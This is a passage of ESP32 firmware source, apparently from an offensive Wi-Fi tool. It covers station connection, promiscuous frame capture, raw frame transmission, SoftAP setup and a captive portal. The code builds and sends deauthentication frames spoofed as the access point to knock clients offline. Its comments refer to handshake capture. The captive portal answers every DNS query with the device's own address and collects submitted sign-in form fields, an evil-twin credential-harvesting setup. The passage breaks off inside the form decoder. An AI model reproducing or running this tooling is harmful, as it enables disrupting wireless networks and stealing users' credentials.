        esp_err_t dhcp_start_err = esp_netif_dhcpc_start(s_sta_netif);
        if (dhcp_start_err != ESP_OK && dhcp_start_err != ESP_ERR_ESP_NETIF_DHCP_ALREADY_STARTED) {
            ESP_LOGW(TAG, "esp32_connect: esp_netif_dhcpc_start returned %s", esp_err_to_name(dhcp_start_err));
        }
    }

    esp_err_t mode_err = esp_wifi_set_mode(WIFI_MODE_STA);
    if (mode_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_connect: esp_wifi_set_mode(STA) returned %s", esp_err_to_name(mode_err));
        out->timed_out = 0; return -1;
    }
    esp_err_t cfg_err = esp_wifi_set_config(WIFI_IF_STA, &cfg);
    if (cfg_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_connect: esp_wifi_set_config returned %s", esp_err_to_name(cfg_err));
        out->timed_out = 0; return -1;
    }
    esp_err_t start_err = esp_wifi_start();
    if (start_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_connect: esp_wifi_start returned %s", esp_err_to_name(start_err));
        out->timed_out = 0; return -1;
    }
    xEventGroupClearBits(s_wifi_events, WIFI_CONNECTED_BIT | WIFI_FAIL_BIT);
    esp_err_t err = esp_wifi_connect();
    if (err != ESP_OK) { out->timed_out = 0; return -1; }

    EventBits_t bits = xEventGroupWaitBits(s_wifi_events, WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,
                                            pdFALSE, pdFALSE, pdMS_TO_TICKS(timeout_ms));
    if (bits & WIFI_CONNECTED_BIT) {
        /* esp_wifi_sta_get_ap_info's own return was previously discarded, so a
         * failure here left `info` as UNINITIALIZED STACK MEMORY that was then
         * copied straight into the wire response (`out->bssid`/`out->channel`)
         * -- a real stack-data leak, not just a missing-error-log gap. Zeroed
         * first and only trusted if the call actually succeeds. */
        wifi_ap_record_t info; memset(&info, 0, sizeof(info));
        esp_err_t info_err = esp_wifi_sta_get_ap_info(&info);
        if (info_err != ESP_OK) {
            ESP_LOGW(TAG, "esp32_connect: esp_wifi_sta_get_ap_info returned %s -- reporting zeroed bssid/channel, never uninitialized stack data", esp_err_to_name(info_err));
        }
        memcpy(out->bssid.b, info.bssid, 6);
        out->channel = info.primary;
        esp_netif_ip_info_t ip_info;
        if (esp_netif_get_ip_info(s_sta_netif, &ip_info) == ESP_OK) {
            memcpy(out->ip.b, &ip_info.ip, 4);
            out->ip_present = 1;
        }
        out->connected = 1;
        /* Locked: capture_prior_state_once/esp32_restore_sta_mode both read
         * s_sta_was_connected under s_prior_state_mutex -- this write must be
         * too, or the read side's own lock is theater. */
        xSemaphoreTake(s_prior_state_mutex, portMAX_DELAY);
        s_sta_was_connected = 1;
        xSemaphoreGive(s_prior_state_mutex);
        return 0;
    }
    if (bits & WIFI_FAIL_BIT) { out->timed_out = 0; return -1; }
    out->timed_out = 1;
    return -1;
}

static void esp32_disconnect(void) {
    /* Logged (not propagated -- this HAL call is void by contract, matching
     * every other List B "stop"/"disconnect" primitive in this file);
     * s_sta_was_connected is still cleared unconditionally below since the
     * caller's own INTENT was to disconnect regardless of whether the radio call
     * itself confirms it, matching this function's pre-existing behavior
     * exactly. */
    esp_err_t err = esp_wifi_disconnect();
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_disconnect: esp_wifi_disconnect returned %s", esp_err_to_name(err));
    }
    xSemaphoreTake(s_prior_state_mutex, portMAX_DELAY);
    s_sta_was_connected = 0;
    xSemaphoreGive(s_prior_state_mutex);
}

static void esp32_get_status(mtk_hal_sta_status_t *out) {
    memset(out, 0, sizeof(*out));
    wifi_ap_record_t info;
    if (esp_wifi_sta_get_ap_info(&info) == ESP_OK) {
        out->connected = 1;
        size_t slen = strnlen((const char *)info.ssid, 32);
        memcpy(out->ssid, info.ssid, slen);
        out->ssid_len = (uint8_t)slen;
        memcpy(out->bssid.b, info.bssid, 6);
        out->channel = info.primary;
        out->rssi = info.rssi;
        esp_netif_ip_info_t ip_info;
        if (s_sta_netif && esp_netif_get_ip_info(s_sta_netif, &ip_info) == ESP_OK && ip_info.ip.addr) {
            memcpy(out->ip.b, &ip_info.ip, 4);
            out->ip_present = 1;
        }
    }
}

/* 802.11 deauthentication frame: fixed 26-byte management frame
 * (fc, duration, addr1=dest, addr2=src, addr3=bssid, seq, reason=2).
 *
 * CONFIRMED HARDWARE-TEST BLOCKER (not a claim of working deauth): the
 * installed ESP-IDF v6.0.1 esp_wifi.h's own doc comment for
 * esp_wifi_80211_tx states "Currently only support for sending
 * beacon/probe request/probe response/action and non-QoS data frame" --
 * a deauthentication frame (management, subtype 0xC0) is not in that
 * documented set. Whether the underlying ESP32-C6 driver actually
 * transmits it anyway (common, undocumented behavior on other ESP32
 * variants in community raw-TX tooling) is NOT confirmed for this chip/
 * IDF version without hardware evidence -- see docs/PROVENANCE.md. The
 * canonical service/protocol logic above this HAL call (target
 * selection, arbiter, lifecycle, STOP/status, radio restoration) is
 * implemented and host-tested regardless of this specific RF-transmit
 * uncertainty; only the final over-the-air step is blocked pending
 * hardware. `en_sys_seq=true` is used unconditionally (never false):
 * per the same doc comment, `false` is only valid *before* a Wi-Fi
 * station connection exists and returns ESP_ERR_INVALID_ARG once
 * connected -- `true` is always valid, so it is the only safe choice for
 * a call site that cannot assume connection state. Every failure is
 * logged (not silently discarded): the caller (mtek_wifi_logic.c) also
 * counts and can report send failures independent of the attempted
 * count already carried on the wire (DEAUTH_STOPPED.total_sent). */
static int esp32_send_deauth(mtk_hal_mac6_t ap_bssid, mtk_hal_mac6_t station, uint8_t channel) {
    if (!capture_prior_state_once()) return -1; /* a required snapshot read failed -- never transmit over unknown prior state */
    /* "Deauth logs a channel-set failure and may still transmit on the wrong
     * channel." A prior round's own fix only went as far as logging the failure
     * -- still transmitting regardless is exactly the defect this item names (a
     * deauth frame genuinely sent on the WRONG channel is not "best effort", it
     * is silently incorrect radio behavior with no signal to the caller beyond a
     * log line). Never transmit if channel selection fails. */
    esp_err_t chan_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (chan_err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_send_deauth: esp_wifi_set_channel(%u) returned %s -- aborting, not transmitting on the wrong channel",
                 channel, esp_err_to_name(chan_err));
        return -1;
    }
    uint8_t frame[26] = {0xC0, 0x00, 0x00, 0x00};
    memcpy(frame + 4, station.b, 6);   /* addr1: destination */
    memcpy(frame + 10, ap_bssid.b, 6); /* addr2: source (spoofed as AP) */
    memcpy(frame + 16, ap_bssid.b, 6); /* addr3: BSSID */
    frame[24] = 2; frame[25] = 0; /* reason code 2: PREV_AUTH_NOT_VALID */
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "esp_wifi_80211_tx(deauth) failed: %s (frame type unconfirmed-supported on this chip/IDF, see docs/PROVENANCE.md)",
                 esp_err_to_name(err));
        return -1;
    }
    return 0;
}

/* + P0 "the claimed callback- quiescence guarantee is not documented": ESP-IDF's
 * own driver docs (docs/en/api-guides/wifi-driver/wifi-modes.rst, shipped with
 * this installed v6.0.1 tree) state plainly that `wifi_promiscuous_cb_t` runs in
 * the context of the Wi-Fi driver task -- they do NOT promise anything about
 * command-routing order or post-return quiescence, which an earlier round's own
 * comment incorrectly asserted; that unsupported claim is removed. Correctness
 * here no longer depends on it at all: promisc_trampoline (this exact
 * Wi-Fi-driver-task callback) now does ONLY a bounded copy and a zero-timeout
 * queue send -- never a mutex wait, never Wi-Fi control APIs, never sink
 * delivery, never calls the registered `cb` directly. A real FreeRTOS task
 * (esp32_promisc_service, driven by mtek_wifi_logic.c's own periodic tick -- see
 * mtek_wifi_service_tick -- itself called from the SAME safe app task already
 * driving the BLE/capture ticks, main/ app_main.c's ble_tick_task) drains the
 * queue and only THEN invokes `cb`, which remains free to call
 * promisc_stop/restore_sta_mode/sink delivery/etc, because by then it is running
 * on a normal task, not the Wi-Fi driver's own. A generation tag is checked at
 * DRAIN time (not relied upon at enqueue time, and never used to claim
 * quiescence) -- `s_promisc_cb`/`s_promisc_user`/`s_promisc_generation` are now
 * only ever touched from safe (non-Wi-Fi-task) contexts (promisc_start/stop, and
 * this service function), under a real mutex -- the Wi-Fi task itself no longer
 * reads any of them at all, closing the data race on them structurally rather
 * than by relying on the retracted quiescence claim. */
static void promisc_trampoline(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    if (!s_promisc_queue) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    promisc_frame_msg_t msg;
    msg.generation = __atomic_load_n(&s_promisc_generation, __ATOMIC_ACQUIRE);
    uint16_t n = pkt->rx_ctrl.sig_len > PROMISC_FRAME_MAX_LEN ? PROMISC_FRAME_MAX_LEN : pkt->rx_ctrl.sig_len;
    memcpy(msg.data, pkt->payload, n);
    msg.len = n; msg.rssi = pkt->rx_ctrl.rssi; msg.channel = pkt->rx_ctrl.channel;
    /* XQueueSend's own return value was previously discarded entirely -- a full
     * queue (the drain task starved, or a genuinely high frame rate exceeding
     * PROMISC_QUEUE_LEN) silently dropped frames with no way for anyone -- a
     * developer reading the log, or a future diagnostics opcode -- to ever learn
     * it happened. A plain (not mutex-guarded) atomic counter, matching
     * s_promisc_generation's own established pattern: this runs from the Wi-Fi
     * driver task and must never take a mutex that could contend with a normal
     * task, but a lock-free increment is always safe here. */
    if (xQueueSend(s_promisc_queue, &msg, 0) != pdTRUE) {
        __atomic_add_fetch(&s_promisc_queue_overflow_count, 1, __ATOMIC_RELAXED);
    }
}

/* Called periodically from a normal FreeRTOS task (never the Wi-Fi
 * driver task) -- see mtek_wifi_service_tick's own doc comment for the
 * real call site. Safe to have `cb` do anything a normal task can:
 * Wi-Fi control APIs, blocking mutexes, sink delivery. */
/* RC11 promiscuous-mode audit follow-up #6 "bound each promiscuous-
 * service drain cycle so the task cannot starve other work": the queue's
 * own fixed capacity (PROMISC_QUEUE_LEN=8) already implicitly bounds an
 * unconditional drain-to-empty loop, but that bound is incidental (tied
 * to a constant this function does not itself enforce) rather than a
 * real, explicit contract this function owns -- raising PROMISC_QUEUE_LEN
 * later for capacity reasons would silently also raise how long a single
 * wifi_promisc_tick_task iteration can run, starving the ble_tick_task-
 * class of periodic work (signal meter, GATT notifications, capture
 * channel hop/duration ticks) sharing this same priority band. An
 * explicit per-call cap, independent of queue capacity, keeps that
 * relationship an intentional decision instead of an accident of a
 * constant defined for an unrelated reason. */
#define PROMISC_SERVICE_MAX_PER_CALL 16

static void esp32_promisc_service(void) {
    if (!s_promisc_queue) return;
    promisc_frame_msg_t msg;
    unsigned drained = 0;
    while (drained < PROMISC_SERVICE_MAX_PER_CALL && xQueueReceive(s_promisc_queue, &msg, 0) == pdTRUE) {
        drained++;
        xSemaphoreTake(s_promisc_cb_mutex, portMAX_DELAY);
        mtk_hal_frame_cb_t cb = s_promisc_cb;
        void *user = s_promisc_user;
        uint32_t current_gen = __atomic_load_n(&s_promisc_generation, __ATOMIC_ACQUIRE);
        xSemaphoreGive(s_promisc_cb_mutex);
        if (!cb || msg.generation != current_gen) continue; /* no active session, or a stale message from an already-superseded one -- drop, never deliver into the wrong generation */
        cb(user, msg.data, msg.len, msg.rssi, msg.channel);
    }
}

/* A real, observable getter -- deliberately NOT logged from promisc_trampoline
 * itself (that context is the Wi-Fi driver task; adding a log call there
 * reintroduces exactly the "do real work from the promiscuous callback" hazard
 * follow-up #1's own fix removes). A future diagnostics opcode, or a periodic
 * check from a normal task (e.g. wifi_promisc_tick_task, which already runs
 * here), can read this without this HAL needing another change. */
uint32_t mtek_wifi_hal_esp32_promisc_queue_overflow_count(void) {
    return __atomic_load_n(&s_promisc_queue_overflow_count, __ATOMIC_RELAXED);
}

/* "Promiscuous entry ignores some callback/channel setup failures... Make
 * monitor entry transactional: on any step failure, restore the prior
 * mode/session and return an error." All three real steps' own return values are
 * now checked (previously only the last one, esp_wifi_set_promiscuous(true),
 * was); a failure at any step unwinds whatever already succeeded (clears the
 * just-registered callback, and defensively disables promiscuous mode again)
 * rather than leaving this HAL's own bookkeeping (s_promisc_cb/s_promisc_user)
 * pointing at a callback the caller's own capture session no longer believes is
 * armed. */
static int esp32_promisc_start(uint8_t channel, mtk_hal_frame_cb_t cb, void *user) {
    if (!capture_prior_state_once()) return -1; /* a required snapshot read failed -- never arm capture over unknown prior state */
    /* Bump the generation and drain any stale queued messages from a
     * prior session BEFORE arming -- a message enqueued under the old
     * generation must never be misread as belonging to this new one. */
    xSemaphoreTake(s_promisc_cb_mutex, portMAX_DELAY);
    __atomic_add_fetch(&s_promisc_generation, 1, __ATOMIC_ACQ_REL);
    s_promisc_cb = cb; s_promisc_user = user;
    xSemaphoreGive(s_promisc_cb_mutex);
    if (s_promisc_queue) { promisc_frame_msg_t discard; while (xQueueReceive(s_promisc_queue, &discard, 0) == pdTRUE) {} }

    esp_err_t cb_err = esp_wifi_set_promiscuous_rx_cb(promisc_trampoline);
    if (cb_err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_promisc_start: esp_wifi_set_promiscuous_rx_cb returned %s", esp_err_to_name(cb_err));
        xSemaphoreTake(s_promisc_cb_mutex, portMAX_DELAY);
        s_promisc_cb = NULL; s_promisc_user = NULL;
        xSemaphoreGive(s_promisc_cb_mutex);
        return -1;
    }
    esp_err_t chan_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (chan_err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_promisc_start: esp_wifi_set_channel(%u) returned %s -- unwinding", channel, esp_err_to_name(chan_err));
        xSemaphoreTake(s_promisc_cb_mutex, portMAX_DELAY);
        s_promisc_cb = NULL; s_promisc_user = NULL;
        xSemaphoreGive(s_promisc_cb_mutex);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        return -1;
    }
    esp_err_t promisc_err = esp_wifi_set_promiscuous(true);
    if (promisc_err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_promisc_start: esp_wifi_set_promiscuous(true) returned %s -- unwinding", esp_err_to_name(promisc_err));
        xSemaphoreTake(s_promisc_cb_mutex, portMAX_DELAY);
        s_promisc_cb = NULL; s_promisc_user = NULL;
        xSemaphoreGive(s_promisc_cb_mutex);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_set_promiscuous(false); /* defensive: leave no ambiguity about whether promiscuous mode is actually active */
        return -1;
    }
    return 0;
}
/* RC11 promiscuous-mode audit follow-up #1 "invalidate the active
 * callback/session generation before disabling promiscuous mode so no
 * frame can be delivered during teardown": the previous order (disable
 * first, invalidate after) left a real window -- esp32_promisc_service
 * runs on its own task (wifi_promisc_tick_task) and can drain a message
 * already sitting in s_promisc_queue (enqueued moments earlier, before
 * this call, under the still-current generation/cb) AT ANY POINT while
 * this function is running, including before esp_wifi_set_promiscuous
 * (false) even takes effect -- this file's own retracted "post-disable
 * quiescence" claim (see promisc_trampoline's own doc comment) means
 * nothing here may assume the driver task's own command ordering closes
 * that window. Invalidating FIRST -- clearing s_promisc_cb to NULL and
 * bumping the generation under the same lock esp32_promisc_service reads
 * both under -- makes every subsequent drain (of an old-generation
 * message still in the queue, or a brand-new one the trampoline might
 * still enqueue before the driver actually stops calling it) resolve to
 * `!cb`, dropped unconditionally, regardless of generation. Disabling the
 * driver's own promiscuous mode and draining the now-guaranteed-stale
 * queue both happen strictly AFTER, closing the delivery window
 * completely rather than merely narrowing it. */
static void esp32_promisc_stop(void) {
    /* If resources never initialized, esp32_promisc_start could not have armed
     * anything (capture_prior_state_once's own gate refuses it immediately) --
     * this can still be reached as a caller's own cleanup path after that
     * refusal (capture_teardown/handshake_finish always call hal->promisc_stop
     * regardless of whether start succeeded), so it must not touch a NULL
     * mutex/queue handle either. */
    if (!s_wifi_resources_ready) return;
    xSemaphoreTake(s_promisc_cb_mutex, portMAX_DELAY);
    __atomic_add_fetch(&s_promisc_generation, 1, __ATOMIC_ACQ_REL); /* invalidate queued/in-flight frames FIRST */
    s_promisc_cb = NULL; s_promisc_user = NULL;
    xSemaphoreGive(s_promisc_cb_mutex);
    esp_wifi_set_promiscuous(false);
    if (s_promisc_queue) { promisc_frame_msg_t discard; while (xQueueReceive(s_promisc_queue, &discard, 0) == pdTRUE) {} }
}
static int esp32_set_channel(uint8_t channel) {
    if (!capture_prior_state_once()) return -1; /* a required snapshot read failed -- never select a channel over unknown prior state */
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_set_channel(%u): esp_wifi_set_channel returned %s", channel, esp_err_to_name(err));
        return -1;
    }
    return 0;
}

static int esp32_get_mode(uint8_t *mode_out) {
    wifi_mode_t m;
    if (esp_wifi_get_mode(&m) != ESP_OK) return -1;
    *mode_out = (uint8_t)m;
    return 0;
}
static int esp32_set_mode(uint8_t mode) { return esp_wifi_set_mode((wifi_mode_t)mode) == ESP_OK ? 0 : -1; }
static void esp32_get_mac(mtk_hal_mac6_t *out) { esp_wifi_get_mac(WIFI_IF_STA, out->b); }
/* RAW_TX_SEND: same documented-frame-type caveat as esp32_send_deauth
 * above (beacon/probe-req/probe-resp/action/non-QoS-data only per the
 * installed ESP-IDF v6.0.1 header); a caller-supplied frame outside that
 * set is not confirmed to transmit on this chip. en_sys_seq=true for the
 * same post-connection-validity reason. */
static int esp32_raw_tx(const uint8_t *frame, uint16_t len) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "esp_wifi_80211_tx(raw) failed: %s", esp_err_to_name(err));
        return -1;
    }
    return 0;
}
/* A real stop/delay/mode/start/reconnect sequence, not just a bare mode switch.
 *
 * "Restoration calls esp_wifi_start without first stopping the already-started
 * driver, ignores several errors, and fire-and-forgets reconnect." RC6's own
 * sequence never called esp_wifi_stop at all -- esp_wifi_set_mode/esp_wifi_start
 * were both issued against a driver that was still running the entire time
 * (esp_wifi_set_promiscuous(false) only clears the promiscuous flag, it does not
 * stop the driver), which is not the ESP-IDF-documented precondition for a mode
 * change (several esp_wifi_* configuration calls, including esp_wifi_set_mode,
 * are only well-defined against a STOPPED driver). Every step's esp_err_t is now
 * checked and logged (previously esp_wifi_set_promiscuous's and
 * esp_wifi_set_mode's own results were silently discarded); the fixed sequence
 * is stop -> delay -> mode -> start -> reconnect, matching the standard ESP-IDF
 * reconfiguration idiom. Real per-step timing/error behavior remains unverified
 * without hardware (`docs/PROVENANCE.md`'s own disclosed hardware-only gap) --
 * this fixes the sequence's own internal correctness against the documented API
 * contract, not a claim this has been observed to work on real silicon. The 50ms
 * settle delay remains a disclosed engineering choice, not a confirmed timing
 * value. Reconnect is fire-and-forget (void, matching every other List B stop/
 * cancel/error path): esp_wifi_connect re-uses whatever wifi_config_t
 * esp32_connect last installed via esp_wifi_set_config, which ESP-IDF retains
 * across a stop/start cycle, so no separate SSID/credential bookkeeping is
 * needed here -- only whether a reconnect should be attempted at all.
 *
 * (rework): the sequence now restores the REAL prior mode and channel captured
 * by capture_prior_state_once at session entry, instead of hard-coding
 * WIFI_MODE_STA and never touching the channel at all -- correct only by
 * coincidence in the common case (mode already STA; channel restored implicitly
 * by a successful reconnect). A prior AP/APSTA mode, or a session where the
 * station was never connected to begin with (so no reconnect ever restores a
 * channel), previously got the wrong mode/channel back silently. Falls back to
 * the old STA-only behavior only if `s_prior_state.valid` is somehow false
 * (restore called with no matching capture -- should not happen in normal
 * operation, but must still leave the radio in a defined, working state rather
 * than acting on garbage).
 *
 * Three real gaps fixed together. (1) The snapshot was cleared BEFORE any
 * restore step ran, so a failure partway through left the ORIGINAL prior state
 * permanently lost with nothing left to retry against -- now cleared only after
 * restoration reaches ITS OWN defined safe terminal state (the end of this
 * function), not up front. (2) Every step ran unconditionally regardless of
 * earlier failures, even ones ESP-IDF's own documentation makes a precondition
 * of the next (esp_wifi_set_mode/esp_wifi_start are only well-defined against a
 * STOPPED driver) -- mode/start/channel/reconnect are now skipped
 * (short-circuited) if esp_wifi_stop itself failed, since attempting them
 * against a driver that may still be running is unverified, not merely
 * unconfirmed-successful. (3) Returned void, so no caller could ever tell
 * restoration failed -- now returns 0 only if every step it actually attempted
 * succeeded, nonzero otherwise; callers must treat a nonzero return as a real,
 * honest failure and must not report clean completion as healthy on the strength
 * of it. */
static int esp32_restore_sta_mode(void) {
    /* Same reachable-after-a- refused-start reasoning as esp32_promisc_stop
     * above -- every cleanup path
     * (capture_teardown/handshake_finish/deauth_finalize/
     * mtek_wifi_restore_and_release) calls this regardless of whether the
     * session ever actually armed anything. Nothing was ever safely captured if
     * resources failed to initialize, so there is nothing real to restore;
     * report failure honestly (matching this HAL's own established
     * "capture_prior_state_once failed -- never proceed" contract) instead of
     * touching a NULL mutex. */
    if (!s_wifi_resources_ready) return -1;
    /* Snapshot into locals under lock -- but do NOT clear `s_prior_state` yet;
     * it is only cleared once restoration reaches its own defined safe terminal
     * state below, so a failure partway through leaves the real prior state
     * available for a future recovery attempt instead of silently discarding it.
     * The real ESP-IDF calls below (esp_wifi_stop/set_mode/set_channel/connect)
     * never run while holding this mutex, matching this whole session's own
     * established "copy state while locked, unlock before external calls"
     * pattern. */
    xSemaphoreTake(s_prior_state_mutex, portMAX_DELAY);
    wifi_mode_t restore_mode = s_prior_state.valid ? s_prior_state.mode : WIFI_MODE_STA;
    uint8_t restore_channel = s_prior_state.valid ? s_prior_state.channel : 0;
    uint8_t was_connected = s_prior_state.valid ? s_prior_state.was_connected : s_sta_was_connected;
    xSemaphoreGive(s_prior_state_mutex);

    int ok = 1;

    /* Promiscuous state IS captured now (capture_prior_state_once), but there is
     * no separate "restore captured true" branch here -- that capture doubles as
     * an invariant check (this HAL never lets a session begin while already
     * promiscuous; capture_prior_state_once fails the entry instead), so the
     * recorded value is always false and unconditionally forcing promiscuous
     * mode off below is already the correct restore for it, not a coincidence. */
    esp_err_t promisc_err = esp_wifi_set_promiscuous(false);
    if (promisc_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_restore_sta_mode: esp_wifi_set_promiscuous(false) returned %s", esp_err_to_name(promisc_err));
        ok = 0;
    }
    esp_err_t stop_err = esp_wifi_stop();       /* stop -- the documented precondition for a mode change */
    if (stop_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_restore_sta_mode: esp_wifi_stop returned %s", esp_err_to_name(stop_err));
        ok = 0;
    }
    /* Short-circuit: esp_wifi_set_mode/esp_wifi_start's own documented
     * precondition is a STOPPED driver -- if stop itself failed, running
     * them anyway would be acting against an unverified driver state, not
     * a merely-unconfirmed-successful one. */
    if (stop_err == ESP_OK) {
        /* HARDWARE DEBT (docs/HARDWARE_DEBT.md, item 1). A fixed settle delay
         * between stop and the mode change. It is deliberately NOT replaced
         * with a retry or event wait: the hazard it guards against is a mode
         * change issued against a driver that has not fully stopped, which
         * ESP-IDF does not guarantee to report as a failed return, so a
         * retry-on-error loop would not detect it. Every radio teardown path
         * (capture, handshake, deauth, raw TX, SoftAP, captive portal,
         * ESP-NOW) runs through here, so changing this timing without
         * hardware measurement would put all of them at risk at once.
         * Replace only with measurements from a real board. */
        vTaskDelay(pdMS_TO_TICKS(50));
        esp_err_t mode_err = esp_wifi_set_mode(restore_mode);
        if (mode_err != ESP_OK) {
            ESP_LOGE(TAG, "esp32_restore_sta_mode: esp_wifi_set_mode(%d) returned %s", (int)restore_mode, esp_err_to_name(mode_err));
            ok = 0;
        }
        esp_err_t start_err = esp_wifi_start();
        if (start_err != ESP_OK) {
            ESP_LOGE(TAG, "esp32_restore_sta_mode: esp_wifi_start returned %s", esp_err_to_name(start_err));
            ok = 0;
        }
        /* Short-circuit: channel select and reconnect both need a
         * genuinely started driver. */
        if (start_err == ESP_OK) {
            if (restore_channel != 0) {
                esp_err_t chan_err = esp_wifi_set_channel(restore_channel, WIFI_SECOND_CHAN_NONE);
                if (chan_err != ESP_OK) {
                    ESP_LOGE(TAG, "esp32_restore_sta_mode: esp_wifi_set_channel(%u) returned %s", restore_channel, esp_err_to_name(chan_err));
                    ok = 0;
                }
            }
            if (was_connected) {                        /* reconnect -- only if genuinely connected before (may itself move the channel to the AP's own, which is expected and correct) */
                esp_err_t rc = esp_wifi_connect();
                if (rc != ESP_OK) {
                    ESP_LOGE(TAG, "esp32_restore_sta_mode: reconnect attempt failed: %s", esp_err_to_name(rc));
                    ok = 0;
                }
            }
        }
    } else {
        ok = 0; /* stop failed: mode/start/channel/reconnect all skipped as unverified */
    }

    /* Keep the snapshot after a failure so WIFI_STOP_ALL/recovery can retry the
     * exact prior state. It is safe to forget only on success. */
    if (ok) {
        xSemaphoreTake(s_prior_state_mutex, portMAX_DELAY);
        s_prior_state.valid = 0; s_prior_state.mode = 0; s_prior_state.channel = 0; s_prior_state.was_connected = 0;
        s_prior_state.promiscuous = false;
        xSemaphoreGive(s_prior_state_mutex);
    }

    return ok ? 0 : -1;
}

static void esp32_pace_delay_ms(uint32_t ms) { vTaskDelay(pdMS_TO_TICKS(ms)); }
/* A real, bounded wait for a STOP handler's own quiescence handshake -- see
 * mtek_wifi_hal.h's own doc comment on why this is deliberately distinct from
 * pace_delay_ms. */
static void esp32_quiescence_wait_ms(uint32_t ms) { vTaskDelay(pdMS_TO_TICKS(ms)); }


/* ---- SoftAP ------------------------------------------------------------
 * Shared by SOFTAP_START and by the captive-portal module, which layers
 * DNS/HTTP over this same interface instead of bringing up a second one.
 * The AP-side DHCP server is started by esp_netif automatically when the
 * interface comes up, so it needs no explicit start here -- but it is torn
 * down explicitly in esp32_softap_stop, because leaving a DHCP server bound
 * after the radio returns to station mode would keep handing out leases on
 * an interface that no longer exists. */
static int esp32_softap_start(const uint8_t *ssid, uint8_t ssid_len,
                               const uint8_t *psk, uint8_t psk_len, uint8_t channel) {
    if (!s_ap_netif) {
        ESP_LOGE(TAG, "esp32_softap_start: no AP netif (creation failed at init) -- refusing");
        return -1;
    }
    /* Borrowing the radio: the prior mode/channel snapshot is what
     * esp32_restore_sta_mode replays on teardown, exactly as every other
     * radio-borrowing entry point here does. */
    if (!capture_prior_state_once()) return -1;

    wifi_config_t cfg = {0};
    memcpy(cfg.ap.ssid, ssid, ssid_len);
    cfg.ap.ssid_len = ssid_len;
    cfg.ap.channel = channel;
    cfg.ap.max_connection = 4;
    cfg.ap.beacon_interval = 100;
    if (psk_len) {
        memcpy(cfg.ap.password, psk, psk_len);
        cfg.ap.authmode = WIFI_AUTH_WPA2_PSK;
    } else {
        cfg.ap.authmode = WIFI_AUTH_OPEN;
    }

    /* Unwound in reverse on any failure so a half-configured AP never stays
     * half-up: a caller that gets -1 must be able to assume no interface is
     * serving. */
    esp_err_t mode_err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (mode_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_softap_start: esp_wifi_set_mode(AP) returned %s", esp_err_to_name(mode_err));
        memset(&cfg, 0, sizeof(cfg));
        return -1;
    }
    esp_err_t cfg_err = esp_wifi_set_config(WIFI_IF_AP, &cfg);
    /* The passphrase lives in this stack copy only as long as the driver call
     * needs it. */
    memset(&cfg, 0, sizeof(cfg));
    if (cfg_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_softap_start: esp_wifi_set_config(AP) returned %s", esp_err_to_name(cfg_err));
        return -1;
    }
    esp_err_t start_err = esp_wifi_start();
    if (start_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_softap_start: esp_wifi_start returned %s", esp_err_to_name(start_err));
        return -1;
    }
    return 0;
}

static void esp32_softap_stop(void) {
    /* Always safe to call, including when no AP ever came up: the teardown
     * path runs it unconditionally. */
    if (s_ap_netif) {
        esp_err_t dhcp_err = esp_netif_dhcps_stop(s_ap_netif);
        if (dhcp_err != ESP_OK && dhcp_err != ESP_ERR_ESP_NETIF_DHCP_ALREADY_STOPPED) {
            ESP_LOGW(TAG, "esp32_softap_stop: esp_netif_dhcps_stop returned %s", esp_err_to_name(dhcp_err));
        }
    }
    /* Mode/channel restoration itself is esp32_restore_sta_mode's job (the
     * shared teardown path calls it right after this), so this function only
     * has to stop serving. */
}

static int esp32_softap_sta_count(uint8_t *count_out) {
    *count_out = 0;
    wifi_sta_list_t list;
    memset(&list, 0, sizeof(list));
    esp_err_t err = esp_wifi_ap_get_sta_list(&list);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_softap_sta_count: esp_wifi_ap_get_sta_list returned %s", esp_err_to_name(err));
        return -1;
    }
    *count_out = (uint8_t)(list.num > 255 ? 255 : list.num);
    return 0;
}

/* ---- Captive portal runtime ------------------------------------------
 * Two listeners over the SoftAP interface brought up above: a DNS responder
 * that answers every A query with the AP's own address (so any lookup steers
 * the client here) and an HTTP server that serves the sign-in page and
 * accepts submitted form fields.
 *
 * Submissions are NOT delivered straight from the HTTP task. They are copied
 * into a small bounded queue and handed to the portable layer from
 * esp32_portal_service, which the application's own periodic tick calls --
 * the same deferred-delivery discipline promisc_trampoline/
 * esp32_promisc_service already use, so service-layer state is never mutated
 * from a driver/server task. */

/* Percent/plus decoding for one application/x-www-form-urlencoded field. */
static uint8_t portal_form_field(const char *body, size_t body_len, const char *key,
                                  uint8_t *out, uint8_t out_cap) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i + key_len + 1 <= body_len; i++) {
        if ((i == 0 || body[i - 1] == '&') &&
            strncmp(body + i, key, key_len) == 0 && body[i + key_len] == '=') {
            size_t v = i + key_len + 1;
            uint8_t n = 0;
            while (v < body_len && body[v] != '&' && n < out_cap) {
                char c = body[v];
                if (c == '+') { out[n++] = ' '; v++; }
                else if (c == '%' && v + 2 < body_len) {
